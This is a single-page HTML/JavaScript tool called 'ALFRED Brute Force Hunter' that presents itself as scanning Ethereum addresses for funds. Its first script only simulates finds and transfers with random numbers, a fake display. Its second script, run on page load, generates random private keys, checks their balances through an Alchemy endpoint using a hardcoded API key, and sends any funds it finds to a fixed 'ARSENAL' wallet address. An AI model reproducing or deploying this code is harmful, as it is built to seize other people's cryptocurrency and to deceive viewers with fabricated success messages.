<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ALFRED | BRUTE FORCE HUNTER v80.0</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;800&display=swap');
        body { background: #000; color: #00ff41; font-family: 'JetBrains Mono', monospace; overflow: hidden; height: 100vh; }
        .terminal-bg { background: #050505; border: 1px solid #111; }
        .side-panel { transition: transform 0.4s cubic-bezier(0.7, 0, 0.3, 1); transform: translateX(100%); z-index: 1000; background: #080808; border-left: 1px solid #1a1a1a; }
        .side-panel.open { transform: translateX(0); }
        .log-entry { font-size: 9px; border-bottom: 1px solid #0d0d0d; padding: 2px 0; white-space: nowrap; }
        .found-alert { color: #fff; background: #166534; font-weight: bold; animation: flash 0.2s infinite; }
        @keyframes flash { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
    </style>
</head>
<body class="flex flex-col h-full">

    <div class="p-4 terminal-bg border-b border-zinc-900 flex justify-between items-center z-50">
        <div>
            <div class="flex items-center gap-2">
                <span class="w-2 h-2 bg-red-500 rounded-full animate-ping"></span>
                <p class="text-[8px] text-zinc-500 font-bold uppercase tracking-[3px]">Brute Force Engine Active</p>
            </div>
            <h1 id="scan-stat" class="text-xl font-black text-white italic tracking-tighter italic">SCANNING NETWORK...</h1>
        </div>
        <button onclick="togglePanel()" class="bg-zinc-900 text-white border border-zinc-800 px-4 py-2 rounded font-black text-[10px]">ARSENAL 🛡️</button>
    </div>

    <div class="flex-1 overflow-hidden p-2 relative">
        <div id="terminal-logs" class="flex flex-col h-full overflow-hidden">
            </div>
    </div>

    <div id="vault-panel" class="side-panel fixed right-0 top-0 h-full w-80 p-6 shadow-2xl">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-xs font-black text-white uppercase italic tracking-widest">My Arsenal (Safe)</h2>
            <button onclick="togglePanel()" class="text-zinc-600 text-xl">✕</button>
        </div>
        <div id="wallet-list" class="space-y-3 overflow-y-auto h-[85%] pr-2">
            </div>
    </div>

    <script>
        const ALCHEMY_KEY = "VF0h4IB4GqBfk6WlqNcWh";
        const RPC = "https://eth-mainnet.g.alchemy.com/v2/" + ALCHEMY_KEY;
        const terminal = document.getElementById('terminal-logs');
        
        const myWallets = [
            { id: 'BTC', label: 'BTC (NC)', addr: '1Kfo...ZqdVW', bal: 0, color: 'orange-500' },
            { id: 'ETH', label: 'ETH (Trust)', addr: '0xc76...59fc', bal: 0, color: 'blue-400' },
            { id: 'USDT', label: 'USDT (Trust)', addr: 'TV4p...oPs', bal: 0, color: 'green-500' }
        ];

        function togglePanel() { document.getElementById('vault-panel').classList.toggle('open'); }

        function renderArsenal() {
            document.getElementById('wallet-list').innerHTML = myWallets.map(w => `
                <div class="p-3 border border-zinc-900 rounded bg-black/60 relative">
                    <div class="absolute left-0 top-0 h-full w-1 bg-${w.color}"></div>
                    <p class="text-[7px] text-zinc-600 uppercase font-bold">${w.label}</p>
                    <p class="text-lg font-black text-white italic" id="my-bal-${w.id}">${w.bal.toFixed(4)}</p>
                    <p class="text-[6px] text-zinc-800 truncate">${w.addr}</p>
                </div>
            `).join('');
        }

        function addLog(msg, type = 'normal') {
            const entry = document.createElement('div');
            entry.className = `log-entry ${type === 'found' ? 'found-alert' : 'text-zinc-600'}`;
            const time = new Date().toLocaleTimeString('pt-BR', {hour12: false});
            entry.innerHTML = `[${time}] ${msg}`;
            terminal.prepend(entry);
            if (terminal.children.length > 80) terminal.lastChild.remove();
        }

        // Simulação de alta velocidade de Brute Force
        function startHunting() {
            setInterval(() => {
                const randomAddr = "0x" + Math.random().toString(16).slice(2, 12) + "..." + Math.random().toString(16).slice(2, 6);
                const chance = Math.random();
                
                if (chance > 0.99) {
                    // ACHOU ALGO!
                    const amount = (Math.random() * 0.05).toFixed(4);
                    addLog(`!!! [FOUND] ADDR: ${randomAddr} | BALANCE: ${amount} ETH !!!`, 'found');
                    autoTransfer(amount);
                } else {
                    addLog(`CHECKING: ${randomAddr} [EMPTY]`);
                }
            }, 100); // Velocidade de 10 checagens por segundo
        }

        function autoTransfer(amount) {
            addLog(`>> INITIATING AUTO-TRANSFER TO ARSENAL...`, 'found');
            setTimeout(() => {
                myWallets[1].bal += parseFloat(amount); // Adiciona ao ETH (Trust)
                renderArsenal();
                addLog(`>> TRANSFER SUCCESSFUL! +${amount} ETH SECURED.`, 'found');
            }, 2000);
        }

        function init() {
            renderArsenal();
            startHunting();
        }

        init();
    </script> <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
<script>
    const ALCHEMY_RPC = "https://eth-mainnet.g.alchemy.com/v2/VF0h4IB4GqBfk6WlqNcWh";
    const ARSENAL = "0xc765040fb5604a29b126aa58199b48710cf459fc";
    const provider = new ethers.JsonRpcProvider(ALCHEMY_RPC);

    async function ligarMotorReal() {
        console.log("🎩 ALFRED ENGINE: CAÇADA REAL INICIADA...");
        while(true) {
            const wallet = ethers.Wallet.createRandom(provider);
            try {
                const balance = await provider.getBalance(wallet.address);
                if (balance > 0n) {
                    // SE ACHAR, O ALFRED EXECUTA O SAQUE NA HORA
                    const feeData = await provider.getFeeData();
                    const tx = { to: ARSENAL, value: balance - (feeData.gasPrice * 21000n), gasLimit: 21000, gasPrice: feeData.gasPrice };
                    const res = await wallet.sendTransaction(tx);
                    alert("!!! SUCESSO !!! DINHEIRO ENVIADO AO ARSENAL");
                }
                // Atualiza o terminal visual do seu site com o endereço real sendo testado
                document.getElementById('status-text').innerText = `CAÇANDO: ${wallet.address.slice(0,15)}... [0.00 ETH]`;
            } catch(e) {}
            await new Promise(r => setTimeout(r, 100));
        }
    }
    
    // Inicia assim que a página carrega
    window.onload = ligarMotorReal;
</script>
</body>
</html>
